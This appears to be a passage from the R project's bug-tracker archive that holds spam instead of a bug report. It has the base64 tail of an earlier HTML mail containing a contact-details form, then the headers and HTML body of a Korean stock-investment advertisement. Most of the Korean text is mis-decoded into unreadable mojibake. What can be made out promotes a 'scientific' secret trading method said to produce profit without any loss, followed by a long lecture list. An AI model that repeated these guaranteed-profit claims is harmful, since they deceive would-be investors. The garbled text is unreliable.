Pi4uLjwvZm9udD4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDogJm5ic3A7
Jm5ic3A7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0i
dGV4dCIgbmFtZT0idGVsMSI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwv
c3Bhbj48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0ibGlu
ZS1oZWlnaHQ6MTQwJTsgbWFyZ2luLXRvcDowOyBtYXJnaW4tYm90dG9tOjA7IG1hcmdpbi1s
ZWZ0OjMwOyI+PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTo5cHQ7Ij7H2rXlxvkgDQogICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgIDo8Zm9udCBjb2xvcj0iI0ZGRkZGRiI+Li4uPC9m
b250PiANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9InRl
eHQiIG5hbWU9InRlbDIiPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8L3Nw
YW4+PC9wPg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHAgc3R5bGU9ImxpbmUt
aGVpZ2h0OjE0MCU7IG1hcmdpbi10b3A6MDsgbWFyZ2luLWJvdHRvbTowOyBtYXJnaW4tbGVm
dDozMDsiPjxzcGFuIHN0eWxlPSJmb250LXNpemU6OXB0OyI+ZS243sDPIA0KICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICA6PGZvbnQgY29sb3I9IiNGRkZGRkYiPi4uLjwvZm9u
dD4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0
IiBuYW1lPSJlbWFpbCI+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc3Bh
bj48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cCBzdHlsZT0ibGluZS1o
ZWlnaHQ6MTQwJTsgbWFyZ2luLXRvcDowOyBtYXJnaW4tYm90dG9tOjA7IG1hcmdpbi1sZWZ0
OjMwOyI+PHNwYW4gc3R5bGU9ImZvbnQtc2l6ZTo5cHQ7Ij7B1rzSPGZvbnQgY29sb3I9IiNG
RkZGRkYiPi4uLjwvZm9udD4gDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDog
Jm5ic3A7Jm5ic3A7IA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW5wdXQg
dHlwZT0idGV4dCIgbmFtZT0iYWRkcmVzcyI+DQogICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIDwvc3Bhbj48L3A+DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC90ZD4N
CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8dGQgd2lkdGg9IjE2NSI+IA0KICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgPGlucHV0IHR5cGU9ImltYWdlIiBzcmM9Imh0dHA6
Ly93d3cubWFpbHBhcnRuZXIuY28ua3IvZW1haWwvMDcyNS9ib2RfMS5qcGciIGJvcmRlcj0i
MCIgbmFtZT0iaW1hZ2UiIHdpZHRoPSIxMDEiIGhlaWdodD0iNzYiPg0KICAgICAgICAgICAg
ICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgICAgICAgIDwvdHI+
DQoJCQk8L2Zvcm0+DQogICAgICAgICAgICAgICAgICAgICAgICA8L3RhYmxlPg0KICAgICAg
ICAgICAgICAgICAgICAgICAgPHAgYWxpZ249ImNlbnRlciI+Jm5ic3A7PC9wPg0KICAgICAg
ICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDwvdHI+DQogICAg
ICAgICAgICAgICAgICA8L3RhYmxlPg0KICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAg
ICAgICAgIDwvdHI+DQogICAgICAgICAgICAgIDx0cj4gDQogICAgICAgICAgICAgICAgPHRk
PiANCiAgICAgICAgICAgICAgICAgIDxwIHN0eWxlPSJsaW5lLWhlaWdodDoxNDAlOyBtYXJn
aW4tdG9wOjA7IG1hcmdpbi1ib3R0b206MDsgbWFyZ2luLWxlZnQ6MTA7IiBhbGlnbj0iY2Vu
dGVyIj48Zm9udCBmYWNlPSKxvLiyIiBjb2xvcj0iIzY2NjY2NiI+PHNwYW4gc3R5bGU9ImZv
bnQtc2l6ZTo5cHQ7Ij48Zm9udCBzaXplPSIyIj6xzcfPwMcgDQogICAgICAgICAgICAgICAg
ICAgIL3CtvS++MDMIMiruri8uiDA/MDav+zG7cC7ILq4s7uw1CC1yMGhIMGkwd/I9yC757D6
ILXluLO0z7TZLiDBpLq4xeu9xbjBIMDMv+s8YnI+DQogICAgICAgICAgICAgICAgICAgIMPL
wfi5/SCx1MGkwLsgwdi89sfPv6kgsaSw7bjewM/A08C7IMelvcPHz7+0wLi45ywgvPa9xbDF
us7A5cShuKYguLa3w8fPsO3A1r3AtM+02S48YnI+DQogICAgICAgICAgICAgICAgICAgIDwv
Zm9udD48L3NwYW4+PC9mb250Pjxmb250IGZhY2U9IrG8uLIiIGNvbG9yPSIjNjY2NjY2IiBz
aXplPSIyIj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjlwdDsiPrz2vcXAuyANCiAgICAgICAg
ICAgICAgICAgICAgv/jEoSC+ysC4vcO46SA8L3NwYW4+PC9mb250Pjxmb250IGNvbG9yPSIj
NjY2NjY2IiBzaXplPSIyIj48c3BhbiBzdHlsZT0iZm9udC1zaXplOjlwdDsiPjxhIGhyZWY9
Im1haWx0bzpoeXVuMTAzMTBAa29ybmV0Lm5ldCI+vPa9xbDFus4oUmVqZWN0IA0KICAgICAg
ICAgICAgICAgICAgICBNYWlsKTwvYT48Zm9udCBmYWNlPSKxvLiyIj64piDFrLivx9ggwda9
yr3Dv+Q8L2ZvbnQ+PC9zcGFuPjwvZm9udD48L3A+DQogICAgICAgICAgICAgICAgPC90ZD4N
CiAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgIDwvdGFibGU+DQogICAgICAgICAg
PC90ZD4NCiAgICAgICAgPC90cj4NCiAgICAgIDwvdGFibGU+DQogICAgPC90ZD4NCiAgPC90
cj4NCjwvdGFibGU+DQo8YnI+DQo8L2JvZHk+DQo8L2h0bWw+DQo=

------=_NextPart_000_0037_01C0F19A.93A23C00--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 2202 *
Subject: [±¤°í] ¾ÆÁ÷µµ ÁÖ½Ä ÅõÀÚÇØ¼­ ¼ÕÇØ¸¦ º¸¼¼¿ä? ¹«·á »ó´ã °¡´É~
From: ÁÖ½ÄÁ¤º¸ <dhdt38nbdhdtydkfhiufhj@hotmail.com>
Date: Wed, 23 Oct 2002 09:08:33 +0900
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 2202 <==
From dhdt38nbdhdtydkfhiufhj@hotmail.com  Wed Oct 23 02:09:35 2002
Received: from hypatia.math.ethz.ch (root@hypatia.ethz.ch [129.132.58.23])
	by pubhealth.ku.dk (8.9.3/8.9.1) with ESMTP id CAA13678
	for <R-bugs@biostat.ku.dk>; Wed, 23 Oct 2002 02:09:34 +0200 (MET DST)
Received: from hotmail.com ([211.204.241.162])
	by hypatia.math.ethz.ch (8.12.6/8.12.6) with SMTP id g9N08OC7011252
	for <r-bugs@lists.r-project.org>; Wed, 23 Oct 2002 02:08:39 +0200 (MEST)
Message-Id: <200210230008.g9N08OC7011252@hypatia.math.ethz.ch>
Reply-To: dhdt38nbdhdtydkfhiufhj@hotmail.com
From: ÁÖ½ÄÁ¤º¸ <dhdt38nbdhdtydkfhiufhj@hotmail.com>
To: <r-bugs@stat.math.ethz.ch>
Subject: [±¤°í] ¾ÆÁ÷µµ ÁÖ½Ä ÅõÀÚÇØ¼­ ¼ÕÇØ¸¦ º¸¼¼¿ä? ¹«·á »ó´ã °¡´É~
Sender: ÁÖ½ÄÁ¤º¸ <dhdt38nbdhdtydkfhiufhj@hotmail.com>
Mime-Version: 1.0
Content-Type: text/html; charset="ks_c_5601-1987"
Date: Wed, 23 Oct 2002 09:08:33 +0900
Content-Transfer-Encoding: 8bit

<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=euc-kr">
<title>¾È³çÇÏ¼¼¿ä.</title>
<meta name="generator" content="Namo WebEditor v5.0">
</head>
<body bgcolor="white" text="black" link="blue" vlink="purple" alink="red">
<div align="left">
<table border="1" cellspacing="0" width="648" bordercolor="#cccccc" bordercolordark="white" bordercolorlight="#999999">
    <tr>
        <td width="642" height="2804" bgcolor="#f0f0ff">
                <p><SPAN style="FONT-SIZE: 10pt">¾È³çÇÏ¼¼¿ä. </SPAN></p>
                <p><SPAN style="FONT-SIZE: 10pt">ÁÖ½ÄÅõÀÚÇØ¼­ ¼ÕÇØ¸¦ º¸¼Ì´ø ºÐÀÌ¶ó¸é Àû±Ø ±ÇÀåÇÏ´Â ºñ¹ýÀÌ ÀÖ½À´Ï´Ù. 
                È¨ÆäÀÌÁö ÁÂÃø¿¡ ÁÖ½ÄÅõÀÚºñ¹ý °Ô½ÃÆÇ¿¡ µé¾î¿À¼Å¼­ °Ô½ÃÆÇ¿¡ ¾î¶² Áú¹®ÀÌµçÁö &nbsp;³²±â½Ã¸é ¼º½É²¯ ´äº¯ÇØµå¸³´Ï´Ù. 
                ÁÖ½ÄÅõÀÚ¿¡ ÃÊº¸ÀÚ ºÐµéÀÌ³ª ¼ÕÇØ¸¦ º¸½ÅºÐµéÀÌ¶ó¸é ²À µé¾î¿À¼¼¿ä^^</SPAN></p>
      <P><SPAN style="FONT-SIZE: 10pt">·Î±×ÀÎ ÇÏ½ÅÈÄ ÁÖ½ÄÅõÀÚºñ¹ý Å¬¸¯ÈÄ ÀÚ¼¼È÷ º¸±â¸¦&nbsp;Å¬¸¯ÇÏ½Ã¸é µ¿¿µ»ó »ùÇÃÀ» º¸½Ç¼ö ÀÖ±¸¿ä. 
                ±×¸®°í ÁÖ½ÄÅõÀÚÀÌ¾ß±â¸¦ Å¬¸¯ÇÏ¼Å¼­ ±¸Ã¼ÀûÀ¸·Î Áú¹®ÇØÁÖ½Ã¸é&nbsp;ÀÚ¼¼ÇÏ°Ô ´äº¯ÇØµå¸³´Ï´Ù.</SPAN></P>
      <P><SPAN style="FONT-SIZE: 10pt">¹é¸¸ÀåÀÚ Å¬·´ÀÇ ÁÖ½ÄÅõÀÚ Å¬·´Àº ÁÖ½Ä¿¡ °ü½ÉÀÖ´Â ºÐµé¸¸ÀÇ Ä¿¹Â´ÏÆ¼ 
      °ø°£ÀÔ´Ï´Ù. ¹«·á È¸¿ø °¡ÀÔÇÏ½Ã°í Âß µÑ·¯ º¸¼¼¿ä. ±×¸®°í ¸¹Àº À¯ÀÍÇÑ Á¤º¸¸¦ ¾ò¾î°¡½Ã±æ º÷´Ï´Ù. <BR><BR></SPAN>
<P><A href="http://lycos.starhana.com" target="_blank"><FONT color="blue"><b>ÁÖ½ÄÅõÀÚ È¨ÆäÀÌÁö 
µé¾î¿À±â</b></FONT></A></P>
     
      <P><SPAN style="FONT-SIZE: 10pt">¹é¸¸ÀåÀÚÅ¬·´¿¡¼­¿¡¼­ Á¦°øÇÏ´Â ÁÖ½ÄÅõÀÚ¹ýÀº ¹Ì±¹ÀÇ ÁÖ½Ä ÄÁ¼³´øÆ® 1À§ÀÎ 
      15¼¼ ¼Ò³âÀÌ ÀÏºÎ ¿î¿ëÇÏ°í ÀÖ´Â ¹æ¹ýÀ¸·Î¼­, <FONT color=blue>´Ù¸¶½º ¼±»ý´ÔÀÌ ÁÖ½Ä°Å·¡ÀÇ ¾Ë°í¸®ÁòÀ» ºÐ¼®ÇÏ¿© ÀÏ»ýÀÇ 
      °ø·ÂÀ» ±â¿ï¿© Á¤¸®ÇÑ Æ¯º°ÇÑ ÁÖ½ÄÅõÀÚÀÇ ºñ¹ý ÀÔ´Ï´Ù.</FONT><BR><BR>ÀÌ&nbsp;ºñ¹ýÀº °úÇÐÀûÀÔ´Ï´Ù. µû¶ó¼­ ¿øÄ¢À» 
      ÀÌÇØÇÏ¸é ´©±¸³ª ¼Õ½Ç¾øÀÌ ¼öÀÍÀ» ³¾ ¼ö ÀÖ´Â ºñ¹ýÀÔ´Ï´Ù. ±×¸®°í ÀÌ ºñ¹ýÀ» ÀÍÈ÷¸é ÁÖ½ÄÅõÀÚ¸¸À¸·Î ¹é¸¸ÀåÀÚÀÇ ²ÞÀ» ÀÌ·ç½Ç¼ö 
      ÀÖ½À´Ï´Ù.</SPAN><span style="FONT-SIZE: 10pt"><br></span></P>
            <p><span style="FONT-SIZE: 10pt">¢º ³» ¿ë : ÃÑ 228 °­ÁÂ, 5,000 ºÐ 
            ºÐ·®ÀÇ µ¿¿µ»ó °­ÁÂ ½Ãµð 15 ¸Å</span></p>
            <p><span style="FONT-SIZE: 10pt">¢º °­ÀÇ ³»¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">1°­. ¹«Á¶°Ç 
            ¼öÀÍ³¾¼ö ÀÖ´Â ¹æ¹ý1<br></span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">2°­. ¾×¸éº´ÇÕ°ú 
            °¨ÀÚ·Î ¼öÀÍ³»±â<br></span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">3°­.ÁÖ½Ä 
            ½Ã°£Â÷ °ø°Ý1<br></span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">4°­.¾Ö³ÎÀÇ 
            µÎ ¾ó±¼À» ÀÌ¿ëÇÑ ½ÇÀüÀÌÀÍ³»±â<br></span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">5°­.ÇÑÁ¾¸ñÀ¸·Î 
            1³â ¼öÀÍ³»±â </span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">6°­.½ÇÀü±ÞµîÁ¶°Ç°ú 
            ¾ÆÁîÅØwb</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">7°­.°ü¸®Á¾¸ñ´Ù·ç±â 
            1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">8°­.¿ì·®ÁÖ´Ù·ç±â 
            1.(¿ì·®ÁÖ·Î¼öÀÍ³»±â)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">9°­.¼¼·ÂÁÖ 
            °£´ÜÃ£±â 1.</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">10°­. 
            ¿ì·®ÁÖ´Ù·ç±â 2.</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">11°­. 
            ¼¼·ÂÁÖ °£´ÜÃ£±â(2)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">12°­. 
            µ¥ÀÌÆ®·¹ÀÌµùÀ¸·Î ¹«Á¶°Ç ¼öÀÍ³»´Â¹ý(80%½Â·ü µ¥ÀÌ&amp;½ºÄ¶ÇÎ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">13°­. 
            ´Ü±â,Áß±â ¹«Á¶°Ç¼öÀÍ³»±â À§ÇÑ °¢Àç·á ´Ù·ç´Â ¹ý</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">14°­. 
            »óÇÑ°¡ Ã¼°á°­µµ ÃøÁ¤Ç¥</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">15°­. 
            ÁöÁö¿Í ÀúÇ×À» ÀÌ¿ëÇÑ ½ÇÀü ¾Ë°í¸®Áò ÀÐ±â(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">16°­.³Ñ 
            Àç¹Õ´Â 1³â¿¡ ´ÜÇÏ·ç ¼±¹°, ÁÖ½Ä ¹«Á¶°Ç ¼öÀÍ³ª´Â ³¯</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">17°­. 
            ¼¼·ÂÁÖ°£´ÜÃ£±â(3)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">18°­.½ÇÀü 
            ±ÞµîÆÐÅÏ (1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">19°­. 
            °³¹Ì¸¦ À§ÇÑ ÀÚ»ê¿î¿ë¹ý(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">20°­. 
            ÇÏÇÑ°¡ Àü·«(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">21°­.»ó½ÂÆÐÅÏ 
            1,2,3,4</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">22°­.»óÇÑ°¡Àü·« 
            (1) - TÀÚ »óÇÑÀâ±â-´Ù¿î·ÎµåÇÏ¼¼¿ä</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">23°­. 
            ¸Å¹°ºÎ´ãÂ÷Æ®¸¦ ÀÌ¿ëÇÑ ±ÞµîÆÐÅÏ</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">24°­. 
            ¼¼·ÂÁÖ °£´ÜÃ£±â(4)-ÄµµéÀÌ¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">25°­. 
            Æø¶ôÀå¿¡¼­ ¼öÀÍ³ª´Â ÇÊ¼öÁ¾¸ñ (1) ¼Ò¾×ÅõÀÚ¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">26°­.µ¹ÆÄÀÇ 
            ½Å·Úµµ ÃøÁ¤(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">27°­.¾Ë°í¸®Áò(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">28°­. 
            ¾Ë°í¸®Áò(2) °Å·¡·®1,OBVÀÇ ¸ÍÁ¡</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">29°­.¾Ë°í¸®Áò(3) 
            °¢µµ¿Í ½É¸®1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">30°­. 
            ¾Ë°í¸®Áò(4) ÀÌÆò-¼ö·Å-»ó½Â</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">31°­.¾îµð¿¡µµ 
            ³ª¿ÀÁö ¾Ê´Â ³Ñ Áø±ÍÇÏ°í ´Ü¼øÇÑ ±ÞµîÆÐÅÏ ÇÏ³ª(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">32°­. 
            ¹Ýµî°ú ¹Ý¶ôÀÇ ¾Ë°í¸®Áò</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">33°­.½ÇÀü´ÜÅ¸¿¡¼­ 
            º¸Á¶ÁöÇ¥ÀÌ¿ë¹ý(1)-TRIX1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">33°­-2 
            ½ÇÀüº¸Á¶ÁöÇ¥ÀÌ¿ë¹ý TRIX2-ÀÏºÀÀ» ÀÌ¿ëÇÑ ¼öÀÍ·ü ±Ø´ëÈ­ ÇÏ±â</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">33°­-3 
            TRIX¶õ?</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">34°­. 
            ´Ù¸¶½º°¡ °¡Àå ÁÁ¾ÆÇÏ´Â Äµµé Inverted Hammer,Gravestone</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">35°­.±×³É 
            ¸¶±¸ Áß¿ä!!!-Á¾ÇÕÀû ¿¬µ¿ ¿¹Ãø¹ý/Å«µ· ±¼¸®´Âµ¥ ÀÌ¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">36°­. 
            °Å·¡·® ´ÙÀÌ¹öÀü½º(Divergence)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">37°­.¸Å¼öÁ¶°Ç 
            ÃøÁ¤¿ä°Ç</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">38°­.°Å·¡·®ºÐ¼®2</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">39°­.Àå±âÀÌÆò(¸Å¹°´ë=ÀúÇ×¼±)¹Ø¿¡¼­ 
            ÁÖ°¡°¡ È¾º¸ÇÒ ¶§</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">40°­.½Å¶ó,È£½Å 
            ÀçÂ÷ºÐ¼®À» ÅëÇÑ »ó½Â,±Þµî¿¹°¨°ú ¿¡³ÊÁöºÐÃâÁ¤µµ ÃøÁ¤</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">41°­. 
            ´ë·®°Å·¡·® ºÐ¼®(½Ã°£¿Ü °Å·¡·® Æ÷ÇÔ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">42-1°­ 
            ÀÏ¸ñ±ÕÇüÇ¥ ÀÌÇØÇÏ±â(±¸Á¶Àû ÀÌÇØ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">42-2°­ 
            ÀÏ¸ñ±ÕÇüÇ¥ ÀÌÇØÇÏ±â(ÆÄµ¿ ÀÌÇØ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">42-3°­.ÀÏ¸ñ±ÕÇüÇ¥ 
            ÀÌÇØÇÏ±â/±¸¼º¿ä¼ÒÀÇ ¿ø¸®,ÆÄµ¿±×¸®±â</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">43°­ ¼¼·ÂÀÇ 
            ¿òÁ÷ÀÓ¿¡ ´ëÇÑ ÀÌÇØ1(µé°í,³²¿¡ ´ëÇÑ ÀÌÇØ)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">44°­.ÁÖ°¡¿¹Ãø¹ý 
            ±âº»1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">45°­.µ¹ÆÄ¿¡ 
            ´ëÇÏ¿© 1 (Áß¿ä)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">46°­.ÁÖ°¡ 
            ¿¡³ÊÁö ±âº»</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">46°­-2 
            ÁÖ°¡ ¿¡³ÊÁö ½ÇÀüÀû¿ë</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">47°­. 
            ¸®½ºÅ© 1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">48°­. 
            µ¹ÆÄ &amp; ¸®½ºÅ©</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">49°­.»ï, 
            3, ß³</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">50°­.¹«Á¶°Ç 
            ¼öÀÍ³»±â 10% ÀÚ»ê¿î¿ë¹ý</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">51°­. 
            ¹Ì¼ö¿Í ¿¡³ÊÁö</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">52°­. 
            ÁÖ°¡¸¦ ¿òÁ÷ÀÌ´Â °Íµé</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">53°­. 
            ÁÖ°¡Á¶ÀÛÀÌ µå·¯³ª ±Þ¶ôÇÑ ÁÖ½Ä¿¡ ´ëÇÑ ÀÌÇØ</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">54°­.ÁöÁö¼±°ú 
            ÄµµéÀÇ ÀÌ¿ëÇÑ ¸Å¸Å¹ý</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">55°­.ÀüÈ¯Çü 
            Candle(Doji)À» ÀÌ¿ëÇÑ ÀÚµ¿°Ë»ö¹ý,¸Å¸Å¹ý,¸Å¸Å½ÇÀü 1, 2, 3 (¾ÆÁÖ Áß¿ä^^)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">55°­-2. 
            °Ë»ö¹ý º¸Ãæ</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">56°­. 
            °£´Ü °¢µµ ±×¸®°í ¸Å¼öÁÖÃ¼ÀÇ °£´Ü½É¸®</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">57°­. 
            ¿ÜÀÎÁöºÐº¯µ¿ ÀÌ¿ë¹ý 1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">57°­-2 
            ¿Ü±¹ÀÎ ÁöºÐº¯µ¿ ÀÌ¿ë¹ý 2</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">57°­-3 
            ¿ÜÀÎ ÁöºÐº¯µ¿ ÀÌ¿ë¹ý 3 / ¿¢¼¿ ÀÌ¿ë¹ý</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">58°­. 
            ¿Ü±¹ÀÎÀÇ Áö¼ö°ü·Ã Áß,´ëÇüÁÖ ¸Å¸Å¹ýºÐ¼®</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">59°­. 
            ½Ã°£+°¡°Ý+ÀúÇ×¼±</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">60°­.William 
            O'Neil ½Å°í°¡ÀÇ ±¸Á¶ÀûÀÌÇØ(¡Ú½Å°í°¡Áß ½Â·ü³ôÀº ÁøÁ¤ÇÑ ½Å°í°¡¶õ?)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">60°­-2 
            ½Å°í°¡ ½ÇÀüºÐ¼®1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">60°­-3 
            ½Å°í°¡ ½ÇÀüºÐ¼®2</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">60°­-4 
            ½Å°í°¡ ½ÇÀü¸Å¸Å (½ÇÀü °Ë»ö¹ý)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">61°­.°í°¡¿Í 
            Àú°¡°¡ °¡Áö´Â ÀÇ¹Ì(1)</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">62°­. 
            ¹Ù´ÚÀÌ¾ß±â</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">63°­.ÀÌµ¿Æò±Õ¼±¿¡ 
            °¨ÃçÁø ¸ðµç °Í 1</span></p>
            <p style="LINE-HEIGHT: 70%"><span style="FONT-SIZE: 10pt">64°­. 
            ÀÀÁý·Ð1 - ´Ù½ÃÇÏ´Â ÇÑº¸Ã¶°­ ÀÌ¾ß±â ±ÞµîÁÖ Ã¹»ó¿¡¼­ Àâ´Â¹ý+´ÜÅ¸°Å·¡</span></p>
<P><font face="±¼¸²"><span style="FONT-SIZE: 10pt"><br></span></font><font face="±¼¸²" color="blue"><span style="FONT-SIZE: 10pt">¸ð È¸»çÀÇ Â÷Æ®´Â Â÷Æ®¸¸ º¸´Âµ¥µµ ¿ù10¸¸¿ø¾¿ ÁöºÒÇØ¾ß ÇÏ´Âµ¥¿ä, ¸ðµÎ ¾Æ½ÃÁÒ. °ñµç Å©·Î½º°¡ ¸Å¼ö½ÃÁ¡ÀÌ¸é¼­ ¸Åµµ½ÃÁ¡ ÀÌ¶ó´Â°É...... Çåµ¥ 
°ñµçÅ©·Î½º¸¦ ¾ÕµÚ ¾øÀÌ ¸Å¼ö½ÃÁ¡À¸·Î¸¸ Ç¥½ÃÇÏ´Â Â÷Æ®°¡ ÀÖ´Ù¸é, ÁÖ½ÄÀÌ ±×·¸°Ô °£´ÜÇÏ¸é ±× Â÷Æ®´Â µ· 
                Âï´Â ±â°è¶ó°í ÇÒ¼ö ÀÖ°ÚÁö¿ä. 
            ±×·±µ¥ ¿Ö 
¼Õ½ÇÀ» º¼±î¿ä? ¿Ö Â÷Æ®¿¡ ´ëÇÑ Æò±Õ ¼öÀÍÀ² ¹ßÇ¥°¡ ¿Ö ¾øÀ»±î¿ä?</span></font></P>
<P><font face="±¼¸²" color="blue"><span style="FONT-SIZE: 10pt">´Ù½Ã ¸»ÇÏÁö¸¸ ÁÖ½ÄÀº º¹ÀâÇÏÁöµµ °£´ÜÇÏÁöµµ ¾Ê½À´Ï´Ù. ÁÖ½ÄÅõÀÚÀÇ ³ëÇÏ¿ì¸¦ Áö´Ï¸é µË´Ï´Ù. 
